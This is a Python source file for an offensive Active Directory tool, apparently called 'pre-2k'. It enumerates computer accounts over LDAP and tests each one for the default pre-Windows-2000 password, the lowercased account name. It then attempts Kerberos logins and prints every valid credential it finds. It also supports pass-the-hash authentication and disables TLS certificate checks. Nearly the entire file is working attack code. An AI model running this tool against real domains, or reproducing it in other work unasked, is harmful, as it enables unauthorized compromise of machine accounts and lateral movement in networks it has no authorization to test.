
from impacket.smbconnection import SMBConnection
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from impacket.examples.utils import parse_credentials, parse_target
from binascii import unhexlify
from ldap3 import ANONYMOUS
import argparse
from getpass import getpass
import logging
import ldap3
import json
import ssl
import sys


# credit to @@Oddvarmoe and their blogpost at:
# https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/


show_banner = '''

                                ___    __         
                              /'___`\ /\ \        
 _____   _ __    __          /\_\ /\ \\\\ \ \/'\    
/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <    
\ \ \L\ \ \ \//\  __//\______\  // /_\ \\\\ \ \\\\`\  
 \ \ ,__/\ \_\\\\ \____\/______/ /\______/ \ \_\ \_\\
  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/
   \ \_\                                      v1.0    
    \/_/                                          
                                            @garrfoster          


'''


def arg_parse():
    parser = argparse.ArgumentParser(add_help=True, description=
    '''Tool to enumerate a target environment for the presence of machine accounts configured as pre-2000 Windows machines.\n
    Either by brute force or a targeted, filtered approach.
    ''')

    auth_group = parser.add_argument_group("Authentication")
    optional_group = parser.add_argument_group("Optional Flags")

    auth_group.add_argument(
        'target',
        action='store',
        help='[[domain/username[:password]@]<address>',
        type=target_type
        )

    auth_group.add_argument(
        '-ldaps',
        action="store_true",
        help='Use LDAPS isntead of LDAP')

    optional_group.add_argument(
        "-dc-ip",
        help = "IP address or FQDN of domain controller",
        required=False
        )
    optional_group.add_argument(
        "-k", "--kerberos",
        action="store_true",
        help='Use Kerberos authentication. Grabs credentials from ccache file '
        '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
        'ones specified in the command line'
        )
    
    optional_group.add_argument(
        "-no-pass",
        action="store_true",
        help="don't ask for password (useful for -k)"
    )
    
    optional_group.add_argument(
        "-hashes",
        metavar="LMHASH:NTHASH",
        help="LM and NT hashes, format is LMHASH:NTHASH",
    )

    optional_group.add_argument(
        '-aes',
        action="store",
        metavar="hex key",
        help='AES key to use for Kerberos Authentication (128 or 256 bits)'
        )
    optional_group.add_argument(
        '-targeted',
        action="store_true",
        help="Search by UserAccountControl=4128. Prone to false positive/negatives but less noisy."
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    args.userdomain = args.target[0]
    args.username = args.target[1]
    args.password = args.target[2]
    args.address = args.target[3]

    args.lmhash = ""
    args.nthash = ""
    if args.hashes:
        args.lmhash, args.nthash = args.hashes.split(':')

    if not (args.password or args.lmhash or args.nthash or args.aes or args.no_pass):
        args.password = getpass("Password:")

    return args

def target_type(target):
    domain, username, password, address = parse_target(target)

    if username == "":
        raise argparse.ArgumentTypeError("Username must be specified")

    if domain == "":
        raise argparse.ArgumentTypeError(
            "Domain of user '{}' must be specified".format(username)
        )

    if address == "":
        raise argparse.ArgumentTypeError(
            "Target address (hostname or IP) must be specified"
        )

    return domain, username, password, address

def get_dn(domain):
    components = domain.split('.')
    base = ''
    for comp in components:
        base += f',DC={comp}'
    
    return base[1:]

def get_machine_name(domain_controller, domain):
    if domain_controller is not None:
        s = SMBConnection(domain_controller, domain_controller)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login('', '')
    except Exception:
        if s.getServerName() == '':
            raise Exception('Error while anonymous logging into %s' % domain)
    else:
        s.logoff()
    return s.getServerName()

def init_ldap_connection(target, tls_version, domain, username, password, lmhash, nthash, domain_controller, kerberos, hashes, aesKey):
    user = '%s\\%s' % (domain, username)
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    ldap_server = ldap3.Server(target, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
    if kerberos:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, aesKey, kdcHost=domain_controller)
    elif hashes is not None:
        if lmhash == "":
            lmhash = "aad3b435b51404eeaad3b435b51404ee"
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    elif username == '' and password == '':
        logging.debug('Performing anonymous bind')
        ldap_session = ldap3.Connection(ldap_server, authentication=ANONYMOUS, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session

def init_ldap_session(domain, username, password, lmhash, nthash, kerberos, domain_controller, ldaps, hashes, aesKey):
    if kerberos:
        target = get_machine_name(domain_controller, domain)
    else:
        if domain_controller is not None:
            target = domain_controller
        else:
            target = domain

    if ldaps:
        try:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1_2, domain, username, password, lmhash, nthash, domain_controller, kerberos, hashes, aesKey)
        except ldap3.core.exceptions.LDAPSocketOpenError:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1, domain, username, password, lmhash, nthash, domain_controller, kerberos, hashes, aesKey)
    else:
        return init_ldap_connection(target, None, domain, username, password, lmhash, nthash, domain_controller, kerberos, hashes, aesKey)

def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None, TGT=None, TGS=None, useCache=True):
    from pyasn1.codec.ber import encoder, decoder
    from pyasn1.type.univ import noValue
    """
    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
    :param string user: username
    :param string password: password for the user
    :param string domain: domain where the account is valid for (required)
    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
    :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
    :param struct TGT: If there's a TGT available, send the structure here and it will be used
    :param struct TGS: same for TGS. See smb3.py for the format
    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
    :return: True, raises an Exception if error.
    """

    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:
            lmhash = '0' + lmhash
        if len(nthash) % 2:
            nthash = '0' + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass

    # Importing down here so pyasn1 is not required if kerberos is not used.
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    import datetime

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash, aesKey, kdcHost)
    else:
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        sessionKey = TGT['sessionKey']

    if TGS is None:
        serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
    else:
        tgs = TGS['KDC_REP']
        cipher = TGS['cipher']
        sessionKey = TGS['sessionKey']

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                  blob.getData())

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)

    connection.bound = True

    return True



class machinehunter:
    
    def __init__(self, ldap_server, ldap_session, domain, targeted):
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        self.search_base = get_dn(domain)
        self.attributes = "sAMAccountName"
        self.domain = domain
        self.targeted = targeted

    def fetch_computers(self, ldap_session):
        creds = []
        if self.targeted:
            search_filter = "(&(objectclass=computer)(useraccountcontrol=4128))"
        else:
            search_filter = "(objectclass=computer)"
        try:
            controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x07)
            ldap_session.extend.standard.paged_search(self.search_base, search_filter, attributes=self.attributes, controls=controls, paged_size=500, generator=False)
            print (f'Retrieved {len(self.ldap_session.entries)} results total.')
            print (f'Testing authentication...')
        except ldap3.core.exceptions.LDAPAttributeError as e:
            print()
            logging.critical(f'Error: {str(e)}')
            exit()
        for entry in ldap_session.entries:
            json_entry = json.loads(entry.entry_to_json())
            attributes = json_entry['attributes'].keys()

            for attr in attributes:
                val = entry[attr].value
                credentials = val + ":" + val.lower()[:-1]
                creds.append(credentials)
        return creds


def main():
    print(show_banner)
    args = arg_parse()


    logging.getLogger().setLevel(logging.INFO)
    try:
        ldap_server, ldap_session = init_ldap_session(domain=args.userdomain,
        username=args.username,
        password=args.password,
        lmhash=args.lmhash,
        nthash=args.nthash,
        kerberos=args.kerberos,
        domain_controller=args.dc_ip,
        aesKey=args.aes,
        hashes=args.hashes,
        ldaps=args.ldaps
        )
    except ldap3.core.exceptions.LDAPSocketOpenError as e: 
        if 'invalid server address' in str(e):
            logging.critical(f'Invalid server address - {args.userdomain}')
        else:
            logging.critical('Error connecting to LDAP server')
            print()
            print(e)
        exit()
    except ldap3.core.exceptions.LDAPBindError as e:
        logging.critical(f'Error: {str(e)}')
        exit()
    #domain=args.userdomain

    finder=machinehunter(ldap_server, ldap_session, domain=args.userdomain, targeted=args.targeted)
    creds = finder.fetch_computers(ldap_session)
    for cred in creds:
        try:
            username, password = cred.split(":")
            ldap_server, ldap_session = init_ldap_session(domain=args.userdomain,
            username=username,
            password=password,
            lmhash=args.lmhash,
            nthash=args.nthash,
            kerberos=True,
            domain_controller=args.dc_ip,
            aesKey=args.aes,
            hashes=args.hashes,
            ldaps=args.ldaps
            )
            if ldap_session:
                print("[+] VALID CREDENTIAL: {}\\{}:{}".format(args.userdomain,username, password))
        except KeyboardInterrupt:
            print("Stopping session...")
            sys.exit()
        except:
            print("[-] Invalid credential: {}\\{}:{}".format(args.userdomain,username, password))




if __name__ == '__main__':
    main()
